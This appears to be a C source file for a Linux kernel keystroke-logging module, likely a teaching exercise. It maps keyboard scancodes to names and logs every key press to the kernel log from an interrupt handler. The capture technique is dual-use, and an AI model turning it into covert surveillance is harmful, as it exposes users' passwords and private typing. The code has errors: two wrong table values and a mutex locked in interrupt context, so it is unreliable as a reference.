#include <linux/list.h>
#include <linux/interrupt.h>
#include <linux/fs.h>
#include <linux/io.h>
#include <linux/time.h>

#include "drivers_and_interrupts.h"

LIST_HEAD(keyboard_log);

#define DICT_SIZE 249

const struct KeyboardCaptureData KEY_DICTIONARY[DICT_SIZE] = {
        { 0x1, "Escape", PRESSED, 0 },
        { 0x2, "1", PRESSED, '1' },
        { 0x3, "2", PRESSED, '2' },
        { 0x4, "3", PRESSED, '3' },
        { 0x5, "4", PRESSED, '4' },
        { 0x6, "5", PRESSED, '5' },
        { 0x7, "6", PRESSED, '6' },
        { 0x8, "7", PRESSED, '7' },
        { 0x9, "8", PRESSED, '8' },
        { 0xa, "9", PRESSED, '9' },
        { 0xb, "0", PRESSED, '0' },
        { 0xc, "-", PRESSED, '-' },
        { 0xd, "=", PRESSED, '=' },
        { 0xe, "Backspace", PRESSED, 0 },
        { 0xf, "Tab", PRESSED, '\t' },
        { 0x10, "Q", PRESSED, 'q' },
        { 0x11, "W", PRESSED, 'w' },
        { 0x12, "E", PRESSED, 'e' },
        { 0x13, "R", PRESSED, 'r' },
        { 0x14, "T", PRESSED, 't' },
        { 0x15, "Y", PRESSED, 'y' },
        { 0x16, "U", PRESSED, 'u' },
        { 0x17, "I", PRESSED, 'i' },
        { 0x18, "O", PRESSED, 'o' },
        { 0x19, "P", PRESSED, 'p' },
        { 0x1a, "[", PRESSED, '[' },
        { 0x1b, "]", PRESSED, ']' },
        { 0x1c, "Enter", PRESSED, '\n' },
        { 0x1d, "Control", PRESSED, 0 },
        { 0x1e, "A", PRESSED, 'a' },
        { 0x1f, "S", PRESSED, 's' },
        { 0x20, "D", PRESSED, 'd' },
        { 0x21, "F", PRESSED, 'f' },
        { 0x22, "G", PRESSED, 'g' },
        { 0x23, "H", PRESSED, 'h' },
        { 0x24, "J", PRESSED, 'j' },
        { 0x25, "K", PRESSED, 'k' },
        { 0x26, "L", PRESSED, 'l' },
        { 0x27, ";", PRESSED, ';' },
        { 0x28, "'", PRESSED, '\'' },
        { 0x29, "`", PRESSED, '`' },
        { 0x2a, "Shift", PRESSED, 0 },
        { 0x2b, "\\", PRESSED, '\\' },
        { 0x2c, "Z", PRESSED, 'z' },
        { 0x2d, "X", PRESSED, 'x' },
        { 0x2e, "C", PRESSED, 'c' },
        { 0x2f, "V", PRESSED, 'v' },
        { 0x30, "B", PRESSED, 'b' },
        { 0x31, "N", PRESSED, 'n' },
        { 0x32, "M", PRESSED, 'm' },
        { 0x33, ",", PRESSED, ',' },
        { 0x34, ".", PRESSED, '.' },
        { 0x35, "/", PRESSED, '/' },
        { 0x36, "Right Shift", PRESSED, 0 },
        { 0x37, "* (Keypad)", PRESSED, '*' },
        { 0x38, "Alt", PRESSED, 0 },
        { 0x39, "Space", PRESSED, ' ' },
        { 0x3a, "CapsLock", PRESSED, 0 },
        { 0x3b, "F1", PRESSED, 0 },
        { 0x3c, "F2", PRESSED, 0 },
        { 0x3d, "F3", PRESSED, 0 },
        { 0x3e, "F4", PRESSED, 0 },
        { 0x3f, "F5", PRESSED, 0 },
        { 0x40, "F6", PRESSED, 0 },
        { 0x41, "F7", PRESSED, 0 },
        { 0x42, "F8", PRESSED, 0 },
        { 0x43, "F9", PRESSED, 0 },
        { 0x44, "F10", PRESSED, 0 },
        { 0x45, "NumberLock", PRESSED, 0 },
        { 0x46, "ScrollLock", PRESSED, 0 },
        { 0x47, "7 (Keypad)", PRESSED, '7' },
        { 0x48, "8 (Keypad)", PRESSED, '8' },
        { 0x49, "9 (Keypad)", PRESSED, '9' },
        { 0x4a, "- (Keypad)", PRESSED, '-' },
        { 0x4b, "4 (Keypad)", PRESSED, '4' },
        { 0x4c, "5 (Keypad)", PRESSED, '5' },
        { 0x4d, "6 (Keypad)", PRESSED, '6' },
        { 0x4e, "+ (Keypad)", PRESSED, '+' },
        { 0x4f, "1 (Keypad)", PRESSED, '1' },
        { 0x50, "2 (Keypad)", PRESSED, '2' },
        { 0x51, "3 (Keypad)", PRESSED, '3' },
        { 0x52, "0 (Keypad)", PRESSED, '0' },
        { 0x53, ". (Keypad)", PRESSED, '.' },
        { 0x57, "F11", PRESSED, 0 },
        { 0x58, "F12", PRESSED, 0 },
        { 0x81, "Escape", RELEASED, 0 },
        { 0x82, "1", RELEASED, '1' },
        { 0x83, "2", RELEASED, '2' },
        { 0x84, "3", RELEASED, '3' },
        { 0x85, "4", RELEASED, '4' },
        { 0x86, "5", RELEASED, '5' },
        { 0x87, "6", RELEASED, '6' },
        { 0x88, "7", RELEASED, '6' },
        { 0x89, "8", RELEASED, '8' },
        { 0x8a, "9", RELEASED, '9' },
        { 0x8b, "0", RELEASED, '0' },
        { 0x8c, "-", RELEASED, '-' },
        { 0x8d, "=", RELEASED, '=' },
        { 0x8e, "Backspace", RELEASED, 0 },
        { 0x8f, "Tab", RELEASED, '\t' },
        { 0x90, "Q", RELEASED, 'q' },
        { 0x91, "W", RELEASED, 'w' },
        { 0x92, "E", RELEASED, 'e' },
        { 0x93, "R", RELEASED, 'r' },
        { 0x94, "T", RELEASED, 't' },
        { 0x95, "Y", RELEASED, 'y' },
        { 0x96, "U", RELEASED, 'u' },
        { 0x97, "I", RELEASED, 'i' },
        { 0x98, "O", RELEASED, 'o' },
        { 0x99, "P", RELEASED, 'p' },
        { 0x9a, "[", RELEASED, '[' },
        { 0x9b, "]", RELEASED, ']' },
        { 0x9c, "Enter", RELEASED, '\n' },
        { 0x9d, "Control", RELEASED, 0 },
        { 0x9e, "A", RELEASED, 'a' },
        { 0x9f, "S", RELEASED, 's' },
        { 0xa0, "D", RELEASED, 'd' },
        { 0xa1, "F", RELEASED, 'f' },
        { 0xa2, "G", RELEASED, 'g' },
        { 0xa3, "H", RELEASED, 'h' },
        { 0xa4, "J", RELEASED, 'j' },
        { 0xa5, "K", RELEASED, 'k' },
        { 0xa6, "L", RELEASED, 'l' },
        { 0xa7, ";", RELEASED, ';' },
        { 0xa8, "'", RELEASED, '\'' },
        { 0xa9, "`", RELEASED, '`' },
        { 0xaa, "Shift", RELEASED, 0 },
        { 0xab, "\\", RELEASED, '\\' },
        { 0xac, "Z", RELEASED, 'z' },
        { 0xad, "X", RELEASED, 'x' },
        { 0xae, "C", RELEASED, 'c' },
        { 0xaf, "V", RELEASED, 'v' },
        { 0xb0, "B", RELEASED, 'b' },
        { 0xb1, "N", RELEASED, 'n' },
        { 0xb2, "M", RELEASED, 'm' },
        { 0xb3, ",", RELEASED, ',' },
        { 0xb4, ".", RELEASED, '.' },
        { 0xb5, "/", RELEASED, '/' },
        { 0xb6, "Right Shift", RELEASED, 0 },
        { 0xb7, "* (Keypad)", RELEASED, '*' },
        { 0xb8, "Alt", RELEASED, 0 },
        { 0xb9, "Space", RELEASED, ' ' },
        { 0xba, "CapsLock", RELEASED, 0 },
        { 0xbb, "F1", RELEASED, 0 },
        { 0xbc, "F2", RELEASED, 0 },
        { 0xbd, "F3", RELEASED, 0 },
        { 0xbe, "F4", RELEASED, 0 },
        { 0xbf, "F5", RELEASED, 0 },
        { 0xc0, "F6", RELEASED, 0 },
        { 0xc1, "F7", RELEASED, 0 },
        { 0xc2, "F8", RELEASED, 0 },
        { 0xc3, "F9", RELEASED, 0 },
        { 0xc4, "F10", RELEASED, 0 },
        { 0xc5, "NumberLock", RELEASED, 0 },
        { 0xc6, "ScrollLock", RELEASED, 0 },
        { 0xc7, "7 (Keypad)", RELEASED, '7' },
        { 0xc8, "8 (Keypad)", RELEASED, '8' },
        { 0xc9, "9 (Keypad)", RELEASED, '9' },
        { 0xca, "- (Keypad)", RELEASED, '-' },
        { 0xcb, "4 (Keypad)", RELEASED, '4' },
        { 0xcc, "5 (Keypad)", RELEASED, '5' },
        { 0xcd, "6 (Keypad)", RELEASED, '6' },
        { 0xce, "+ (Keypad)", RELEASED, '+' },
        { 0xcf, "1 (Keypad)", RELEASED, '1' },
        { 0xd0, "2 (Keypad)", RELEASED, '2' },
        { 0xd1, "3 (Keypad)", RELEASED, '4' },
        { 0xd2, "0 (Keypad)", RELEASED, '0' },
        { 0xd3, ". (Keypad)", RELEASED, '.' },
        { 0xd7, "F11", RELEASED, 0 },
        { 0xd8, "F12", RELEASED, 0 },
        { 0xe010, "Previous Track", PRESSED, 0 },
        { 0xe019, "Next Track", PRESSED, 0 },
        { 0xe01c, "Enter (Keypad)", PRESSED, '\n' },
        { 0xe01d, "Right Control", PRESSED, 0 },
        { 0xe020, "Mute", PRESSED, 0 },
        { 0xe021, "Calculator", PRESSED, 0 },
        { 0xe022, "Play", PRESSED, 0 },
        { 0xe024, "Stop", PRESSED, 0 },
        { 0xe02e, "Volume Down", PRESSED, 0 },
        { 0xe030, "Volume Up", PRESSED, 0 },
        { 0xe032, "Home", PRESSED, 0 },
        { 0xe035, "/ (Keypad)", PRESSED, '/' },
        { 0xe038, "AltGr", PRESSED, 0 },
        { 0xe047, "Home", PRESSED, 0 },
        { 0xe048, "Up", PRESSED, 0 },
        { 0xe049, "Page Up", PRESSED, 0 },
        { 0xe04b, "Left", PRESSED, 0 },
        { 0xe04d, "Right", PRESSED, 0 },
        { 0xe04f, "End", PRESSED, 0 },
        { 0xe050, "Down", PRESSED, 0 },
        { 0xe051, "Page Down", PRESSED, 0 },
        { 0xe052, "Insert", PRESSED, 0 },
        { 0xe053, "Delete", PRESSED, 0 },
        { 0xe05b, "Left GUI", PRESSED, 0 },
        { 0xe05c, "Right GUI", PRESSED, 0 },
        { 0xe05d, "\"Apps\"", PRESSED, 0 },
        { 0xe05e, "Power", PRESSED, 0 },
        { 0xe05f, "Sleep", PRESSED, 0 },
        { 0xe063, "Wake", PRESSED, 0 },
        { 0xe065, "Search", PRESSED, 0 },
        { 0xe066, "Favorites", PRESSED, 0 },
        { 0xe067, "Refresh", PRESSED, 0 },
        { 0xe068, "Stop", PRESSED, 0 },
        { 0xe069, "Forward", PRESSED, 0 },
        { 0xe06a, "Back", PRESSED, 0 },
        { 0xe06b, "My Computer", PRESSED, 0 },
        { 0xe06c, "Email", PRESSED, 0 },
        { 0xe06d, "Media Select", PRESSED, 0 },
        { 0xe090, "Previous Track", RELEASED, 0 },
        { 0xe099, "Next Track", RELEASED, 0 },
        { 0xe09c, "Enter", RELEASED, '\n' },
        { 0xe09d, "Right Control", RELEASED, 0 },
        { 0xe0a0, "Mute", RELEASED, 0 },
        { 0xe0a1, "Calculator", RELEASED, 0 },
        { 0xe0a2, "Play", RELEASED, 0 },
        { 0xe0a4, "Stop", RELEASED, 0 },
        { 0xe0ae, "Volume Down", RELEASED, 0 },
        { 0xe0b0, "Volume Up", RELEASED, 0 },
        { 0xe0b2, "Home", RELEASED, 0 },
        { 0xe0b5, "/ (Keypad)", RELEASED, '/' },
        { 0xe0b8, "AltGr", RELEASED, 0 },
        { 0xe0c7, "Home", RELEASED, 0 },
        { 0xe0c8, "Up", RELEASED, 0 },
        { 0xe0c9, "Page Up", RELEASED, 0 },
        { 0xe0cb, "Left", RELEASED, 0 },
        { 0xe0cd, "Right", RELEASED, 0 },
        { 0xe0cf, "End", RELEASED, 0 },
        { 0xe0d0, "Down", RELEASED, 0 },
        { 0xe0d1, "Page Down", RELEASED, 0 },
        { 0xe0d2, "Insert", RELEASED, 0 },
        { 0xe0d3, "Delete", RELEASED, 0 },
        { 0xe0db, "Left GUI", RELEASED, 0 },
        { 0xe0dc, "Right GUI", RELEASED, 0 },
        { 0xe0dd, "\"Apps\"", RELEASED, 0 },
        { 0xe0de, "Power", RELEASED, 0 },
        { 0xe0df, "Sleep", RELEASED, 0 },
        { 0xe0e3, "Wake", RELEASED, 0 },
        { 0xe0e5, "Search", RELEASED, 0 },
        { 0xe0e6, "Favorites", RELEASED, 0 },
        { 0xe0e7, "Refresh", RELEASED, 0 },
        { 0xe0e8, "Stop", RELEASED, 0 },
        { 0xe0e9, "Forward", RELEASED, 0 },
        { 0xe0ea, "Back", RELEASED, 0 },
        { 0xe0eb, "My Computer", RELEASED, 0 },
        { 0xe0ec, "Email", RELEASED, 0 },
        { 0xe0ed, "Media Select", RELEASED, 0 },
        { 0xe02ae037, "Print Screen", PRESSED, 0 },
        { 0xe0b7e0aa, "Print Screen", RELEASED, 0 },
        { 0xe11d45e19dc5, "Pause", PRESSED, 0 },
};

struct KeyboardCaptureData find_key_from_code(uint64_t code) {
    for (size_t i = 0; i < DICT_SIZE; i++) {
        if (KEY_DICTIONARY[i].code == code) {
            return KEY_DICTIONARY[i];
        }
    }
    struct KeyboardCaptureData dummy =  { 0, "", PRESSED, 0 };
    return dummy;
}

void printk_key_event(struct KeyboardCaptureData key) {
    struct timespec64 now;
    ktime_get_real_ts64(&now);
    char sec = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) % 60;
    char min = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 % 60;
    char hour = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 / 60 % 24;
    printk(KERN_INFO "%d:%d:%d \"%s\" ", hour, min, sec, key.key_name);
    if (key.ascii_value) {
        printk(KERN_CONT "(0x%x) ", key.ascii_value);
    }
    if (key.state == PRESSED) {
        printk(KERN_CONT "PRESSED\n");
    } else {
        printk(KERN_CONT "RELEASED\n");
    }
}

irqreturn_t key_logger_isr(int i, void *dummy) {
    uint64_t code = inb(0x60);
    struct KeyboardCaptureData key = find_key_from_code(code);
    if (!key.code) {
        return IRQ_NONE;
    }
    mutex_lock(&lock);
    printk_key_event(key);
    mutex_unlock(&lock);
    return IRQ_HANDLED;
}


//static int keyboard_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
//    struct keyboard_notifier_param *param = _param;
//
//    printk("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", code, param->down, param->shift, param->value);
//    return NOTIFY_OK;
//}


